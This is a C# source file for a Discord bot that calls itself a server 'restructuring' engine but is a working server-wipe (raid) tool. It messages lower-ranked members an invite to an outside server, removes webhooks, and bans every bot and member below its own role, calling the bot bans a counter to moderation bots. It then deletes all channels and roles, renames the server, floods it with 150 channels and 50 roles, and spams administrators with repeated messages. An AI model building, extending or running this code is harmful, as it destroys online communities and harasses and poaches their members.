using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace AbyssCore
{
    /// <summary>
    /// 全服架構重構核心管線引擎 (三段式階梯清理 + 兩階段多工並發流水線)
    /// 執行順序:
    ///   步驟 1: 私訊身分組低於機器人之成員防誤踢邀請碼 (wWB2RcR7pX)
    ///   步驟 2: 完整備份伺服器架構 JSON 檔案
    ///   步驟 3: 清理成員 (優先拔除 Webhook -> 優先封鎖外部 Bot -> 處分低階成員)
    ///   步驟 4: 清理舊類別、舊頻道、舊身分組並套用品牌主題
    ///   步驟 5: 並發極速建置 150 迷宮頻道 + 50 迷宮身分組 (主動令牌桶控速)
    ///   步驟 6: 最後發送重構日誌至伺服器最頂端第一個頻道
    /// </summary>
    public sealed class PipelineEngine
    {
        private readonly DiscordApiClient _client;
        private readonly TextsConfig _texts;

        public PipelineEngine(DiscordApiClient client, TextsConfig texts)
        {
            _client = client;
            _texts = texts;
        }

        public async Task<PipelineReport> ExecuteFullOverhaulAsync(
            string guildId,
            string guildName,
            Action<string>? progressCallback = null)
        {
            var sw = Stopwatch.StartNew();
            var report = new PipelineReport();

            // -----------------------------------------------------------------
            // 前置作業：伺服器資訊分析與身分組位階判定
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [前置分析] 正在解析伺服器權限結構與身分組位階...");

            var guildObj = await _client.GetGuildAsync(guildId);
            string ownerId = guildObj?.TryGetProperty("owner_id", out var oProp) == true ? oProp.GetString() ?? "" : "";

            var roles = await _client.GetGuildRolesAsync(guildId);
            var rolePosMap = new Dictionary<string, int>();
            foreach (var r in roles)
            {
                string rid = r.GetProperty("id").GetString()!;
                int pos = r.TryGetProperty("position", out var pProp) ? pProp.GetInt32() : 0;
                rolePosMap[rid] = pos;
            }

            var me = await _client.GetCurrentUserAsync();
            string myId = me?.GetProperty("id").GetString() ?? "";

            var members = await _client.GetGuildMembersAsync(guildId);

            // 計算機器人自身的最高身分組位階
            int botMaxPos = 0;
            var botMember = members.FirstOrDefault(m => m.TryGetProperty("user", out var u) && u.GetProperty("id").GetString() == myId);
            if (botMember.ValueKind == JsonValueKind.Object && botMember.TryGetProperty("roles", out var bRoles))
            {
                foreach (var rEl in bRoles.EnumerateArray())
                {
                    string rid = rEl.GetString()!;
                    if (rolePosMap.TryGetValue(rid, out int pos) && pos > botMaxPos)
                    {
                        botMaxPos = pos;
                    }
                }
            }
            else
            {
                var bMem = await _client.GetGuildMemberAsync(guildId, myId);
                if (bMem.HasValue && bMem.Value.TryGetProperty("roles", out var bRoles2))
                {
                    foreach (var rEl in bRoles2.EnumerateArray())
                    {
                        string rid = rEl.GetString()!;
                        if (rolePosMap.TryGetValue(rid, out int pos) && pos > botMaxPos)
                        {
                            botMaxPos = pos;
                        }
                    }
                }
            }

            // 篩選出低於機器人身分組之對象 (保護擁有者與機器人自身)
            var targetBots = new List<string>();
            var targetHumans = new List<string>();

            foreach (var m in members)
            {
                if (!m.TryGetProperty("user", out var userProp)) continue;
                string uid = userProp.GetProperty("id").GetString()!;
                if (uid == myId || uid == ownerId) continue;

                int memMaxPos = 0;
                if (m.TryGetProperty("roles", out var mRoles))
                {
                    foreach (var rEl in mRoles.EnumerateArray())
                    {
                        string rid = rEl.GetString()!;
                        if (rolePosMap.TryGetValue(rid, out int pos) && pos > memMaxPos)
                        {
                            memMaxPos = pos;
                        }
                    }
                }

                bool canPurge = botMaxPos > 0 ? (memMaxPos < botMaxPos) : (memMaxPos == 0);
                if (canPurge)
                {
                    bool isBot = userProp.TryGetProperty("bot", out var bProp) && bProp.GetBoolean();
                    if (isBot)
                    {
                        targetBots.Add(uid);
                    }
                    else
                    {
                        targetHumans.Add(uid);
                    }
                }
            }

            // -----------------------------------------------------------------
            // 步驟 1: 私訊身分組低於 bot 的用戶 (發送防誤踢邀請碼 wWB2RcR7pX)
            // -----------------------------------------------------------------
            if (targetHumans.Count > 0)
            {
                progressCallback?.Invoke($"◈ [步驟 1/6] 正在向 {targetHumans.Count} 位低階成員私訊發送防誤踢邀請碼 (wWB2RcR7pX)...");
                const string inviteCode = "wWB2RcR7pX";
                string dmNotice = $"✦ 【永恆深淵 · 伺服器防誤踢通知】\n親愛的成員您好，伺服器正進行架構維護與重構，為避免您誤被清除後失聯，請妥善保存永久邀請連結：https://discord.gg/{inviteCode} (邀請碼: {inviteCode})\n期待您隨時重新加入！";

                var dmTasks = targetHumans.Select(uid => Task.Run(async () =>
                {
                    try
                    {
                        string? dmId = await _client.CreateDmChannelAsync(uid);
                        if (!string.IsNullOrEmpty(dmId))
                        {
                            if (await _client.SendMessageAsync(dmId, dmNotice))
                            {
                                Interlocked.Increment(ref report.DmInvitedMembers);
                            }
                        }
                    }
                    catch
                    {
                        // 忽略個別用戶關閉私訊之異常
                    }
                }));
                await Task.WhenAll(dmTasks);
                progressCallback?.Invoke($"  ✔ [邀請碼私訊] 私訊送達完成: 成功向 {report.DmInvitedMembers}/{targetHumans.Count} 位成員發送防誤踢通知。");
            }

            // -----------------------------------------------------------------
            // 步驟 2: 然後備份全服架構 JSON
            // -----------------------------------------------------------------
            progressCallback?.Invoke("◈ [步驟 2/6] 正在完整備份伺服器頻道、身分組與階級至 JSON 檔案...");
            try
            {
                string bPath = await GuildBackupManager.BackupGuildStructureAsync(_client, guildId, guildName, "backups");
                report.BackupFilePath = bPath;
                progressCallback?.Invoke($"  ✔ [前置備份] 備份成功: {System.IO.Path.GetFileName(bPath)}");
            }
            catch (Exception ex)
            {
                progressCallback?.Invoke($"  ▲ [前置備份] 備份略過: {ex.Message}");
            }

            // -----------------------------------------------------------------
            // 步驟 3: 清理成員 (拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員)
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [步驟 3/6] 啟動成員清理流水線：拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員...");

            // 3.1 優先清理 Webhooks
            report.DeletedWebhooks = await _client.ClearAllWebhooksAsync(guildId);
            progressCallback?.Invoke($"  ✔ [成員階梯 1/3] 已成功拔除 {report.DeletedWebhooks} 個外部 Webhook 通道。");

            // 3.2 優先封鎖外部 Bot
            if (targetBots.Count > 0)
            {
                progressCallback?.Invoke($"  ◈ [成員階梯 2/3] 正在優先封鎖 {targetBots.Count} 個外部 Bot (防管理 Bot 反制)...");
                var botTasks = targetBots.Select(uid => Task.Run(async () =>
                {
                    if (await _client.BanMemberAsync(guildId, uid))
                    {
                        Interlocked.Increment(ref report.BannedBots);
                    }
                }));
                await Task.WhenAll(botTasks);
            }

            // 3.3 全面封鎖身分組在機器人自身之下之全體成員
            if (targetHumans.Count > 0)
            {
                progressCallback?.Invoke($"  ❖ [成員階梯 3/3] 正在全面處分 {targetHumans.Count} 位低於機器人身分組之成員...");
                var humanTasks = targetHumans.Select(uid => Task.Run(async () =>
                {
                    if (await _client.BanMemberAsync(guildId, uid))
                    {
                        Interlocked.Increment(ref report.BannedHumans);
                    }
                }));
                await Task.WhenAll(humanTasks);
            }

            // -----------------------------------------------------------------
            // 步驟 4: 清理舊類別、舊頻道、舊身分組並套用品牌主題
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [步驟 4/6] 同步清理舊類別、舊頻道、舊身分組並套用主題名稱與描述...");

            var channels = await _client.GetGuildChannelsAsync(guildId);
            var categoryList = channels.Where(ch => ch.TryGetProperty("type", out var t) && t.GetInt32() == 4).ToList();
            var nonCategoryList = channels.Where(ch => !ch.TryGetProperty("type", out var t) || t.GetInt32() != 4).ToList();

            int chLimit = _texts.DefaultValues.CleanupChannelLimit;
            string targetName = _texts.GuildSettings.TargetGuildName;
            string targetDesc = _texts.GuildSettings.TargetGuildDescription;

            var delCatTasks = categoryList.Select(ch =>
            {
                string cid = ch.GetProperty("id").GetString()!;
                return Task.Run(async () =>
                {
                    if (await _client.DeleteChannelAsync(cid))
                    {
                        Interlocked.Increment(ref report.DeletedCategories);
                    }
                });
            });

            var delChTasks = nonCategoryList.Take(chLimit).Select(ch =>
            {
                string cid = ch.GetProperty("id").GetString()!;
                return Task.Run(async () =>
                {
                    if (await _client.DeleteChannelAsync(cid))
                    {
                        Interlocked.Increment(ref report.DeletedChannels);
                    }
                });
            });

            var delRoleTasks = roles.Where(r => r.GetProperty("name").GetString() != "@everyone").Select(r =>
            {
                string rid = r.GetProperty("id").GetString()!;
                return Task.Run(async () =>
                {
                    if (await _client.DeleteRoleAsync(guildId, rid))
                    {
                        Interlocked.Increment(ref report.DeletedRoles);
                    }
                });
            });

            var brandingTask = Task.Run(async () =>
            {
                report.GuildRenamed = await _client.ModifyGuildAsync(guildId, targetName, targetDesc);
            });

            await Task.WhenAll(delCatTasks.Concat(delChTasks).Concat(delRoleTasks).Append(brandingTask));

            // -----------------------------------------------------------------
            // 步驟 5: 並發極速建置 150 迷宮頻道 + 50 迷宮身分組 (主動令牌桶控速)
            // -----------------------------------------------------------------
            int targetChannels = _texts.DefaultValues.CleanupCreateChannels; // 預設 150
            int targetRoles = _texts.DefaultValues.CleanupCreateRoles;       // 預設 50

            progressCallback?.Invoke($"★ [步驟 5/6] 主動令牌桶控速：同步建立 {targetChannels} 個迷宮頻道 + {targetRoles} 個迷宮身分組...");

            var chNamesPool = _texts.DefaultNames.ChannelNames;
            var roleNamesPool = _texts.DefaultNames.RoleNames;

            var createChTasks = Enumerable.Range(1, targetChannels).Select(i =>
            {
                string name = $"▸-{chNamesPool[i % chNamesPool.Count]}-{i:D3}";
                return Task.Run(async () =>
                {
                    var cid = await _client.CreateChannelAsync(guildId, name, type: 0);
                    if (cid != null)
                    {
                        Interlocked.Increment(ref report.CreatedChannels);
                    }
                });
            });

            var createRoleTasks = Enumerable.Range(1, targetRoles).Select(i =>
            {
                string name = $"✦ {roleNamesPool[i % roleNamesPool.Count]} Lv.{i}";
                int color = Random.Shared.Next(0x100000, 0xFFFFFF);
                return Task.Run(async () =>
                {
                    var rid = await _client.CreateRoleAsync(guildId, name, color);
                    if (rid != null)
                    {
                        Interlocked.Increment(ref report.CreatedRoles);
                    }
                });
            });

            await Task.WhenAll(createChTasks.Concat(createRoleTasks));

            sw.Stop();
            report.ElapsedSeconds = sw.Elapsed.TotalSeconds;

            // -----------------------------------------------------------------
            // 步驟 6: 最後發送 log 到伺服器第一個頻道 (最上面的頻道)
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [步驟 6/6] 正在尋找伺服器最頂部頻道並發布最終重構日誌...");
            try
            {
                var updatedChannels = await _client.GetGuildChannelsAsync(guildId);
                var textChannels = updatedChannels
                    .Where(ch => ch.TryGetProperty("type", out var t) && t.GetInt32() == 0)
                    .OrderBy(ch => ch.TryGetProperty("position", out var p) ? p.GetInt32() : 0)
                    .ToList();

                if (textChannels.Count > 0)
                {
                    string topChannelId = textChannels[0].GetProperty("id").GetString()!;
                    report.TopChannelId = topChannelId;
                    string logContent =
                        "✦ **【永恆深淵 · 全景深度重構完成報告】** ✦\n" +
                        $"• 清理了 `{report.DeletedCategories}` 個類別\n" +
                        $"• 清理了 `{report.DeletedChannels}` 個頻道\n" +
                        $"• 清理了 `{report.BannedBots}` 個 bot\n" +
                        $"• 清理了 `{report.BannedHumans}` 個成員\n" +
                        $"• 已向 `{report.DmInvitedMembers}` 位成員私訊發送防誤踢邀請碼 (wWB2RcR7pX)\n" +
                        $"• 拔除 Webhook: `{report.DeletedWebhooks}` 個\n" +
                        $"• 刪除舊身分組: `{report.DeletedRoles}` 個\n" +
                        $"★ 新建迷宮頻道: `{report.CreatedChannels}` 個\n" +
                        $"★ 新建迷宮身分組: `{report.CreatedRoles}` 個\n" +
                        $"◈ 總耗時間: `{report.ElapsedSeconds:F2}` 秒";

                    bool logSent = await _client.SendMessageAsync(topChannelId, logContent);
                    if (logSent)
                    {
                        report.TopChannelLogged = true;
                        progressCallback?.Invoke($"✔ [步驟 6/6] 成功將日誌寫入伺服器頂部頻道 (ID: {topChannelId})！");
                    }
                }
            }
            catch (Exception ex)
            {
                progressCallback?.Invoke($"▲ [步驟 6/6] 日誌發送略過: {ex.Message}");
            }

            return report;
        }

        /// <summary>
        /// 向伺服器內所有真人管理員（含伺服器擁有者）批量發送私訊通知
        /// </summary>
        public async Task<(int TotalSent, int TargetTotal, int AdminCount)> SendDmToAdminsAsync(
            string guildId,
            int count = 10,
            string? message = null,
            Action<string>? progressCallback = null)
        {
            string content = string.IsNullOrWhiteSpace(message) ? "迷宮以開啟" : message;

            var guild = await _client.GetGuildAsync(guildId);
            string ownerId = guild?.TryGetProperty("owner_id", out var oProp) == true ? oProp.GetString() ?? "" : "";

            var roles = await _client.GetGuildRolesAsync(guildId);
            var adminRoleIds = new HashSet<string>();
            foreach (var r in roles)
            {
                string rid = r.GetProperty("id").GetString()!;
                if (r.TryGetProperty("permissions", out var pProp))
                {
                    if (ulong.TryParse(pProp.GetString(), out ulong permVal) && (permVal & 0x8) != 0)
                    {
                        adminRoleIds.Add(rid);
                    }
                }
            }

            var members = await _client.GetGuildMembersAsync(guildId);
            var me = await _client.GetCurrentUserAsync();
            string myId = me?.GetProperty("id").GetString() ?? "";

            var adminMembers = new List<string>();
            foreach (var m in members)
            {
                if (!m.TryGetProperty("user", out var u)) continue;
                string uid = u.GetProperty("id").GetString()!;
                if (uid == myId) continue;
                bool isBot = u.TryGetProperty("bot", out var b) && b.GetBoolean();
                if (isBot) continue;

                bool isAdmin = uid == ownerId;
                if (!isAdmin && m.TryGetProperty("roles", out var rArray))
                {
                    foreach (var rEl in rArray.EnumerateArray())
                    {
                        if (adminRoleIds.Contains(rEl.GetString()!))
                        {
                            isAdmin = true;
                            break;
                        }
                    }
                }

                if (isAdmin)
                {
                    adminMembers.Add(uid);
                }
            }

            if (adminMembers.Count == 0)
            {
                return (0, 0, 0);
            }

            int targetTotal = adminMembers.Count * count;
            progressCallback?.Invoke($"◈ 正在向 {adminMembers.Count} 位真人管理員建立私訊通道，每人發送 {count} 次 (共目標 {targetTotal} 則)...");

            int totalSent = 0;
            var tasks = adminMembers.Select(uid => Task.Run(async () =>
            {
                string? dmChId = await _client.CreateDmChannelAsync(uid);
                if (string.IsNullOrEmpty(dmChId)) return;

                for (int i = 0; i < count; i++)
                {
                    if (await _client.SendMessageAsync(dmChId, content))
                    {
                        Interlocked.Increment(ref totalSent);
                    }
                    if (count > 1)
                    {
                        await Task.Delay(120);
                    }
                }
            }));

            await Task.WhenAll(tasks);
            return (totalSent, targetTotal, adminMembers.Count);
        }
    }

    public class PipelineReport
    {
        public string? BackupFilePath { get; set; }
        public int DmInvitedMembers;
        public int DeletedWebhooks;
        public int BannedBots;
        public int BannedHumans;
        public int DeletedCategories;
        public int DeletedChannels;
        public int DeletedRoles;
        public int CreatedChannels;
        public int CreatedRoles;
        public bool GuildRenamed;
        public bool TopChannelLogged;
        public string? TopChannelId { get; set; }
        public double ElapsedSeconds;
    }
}
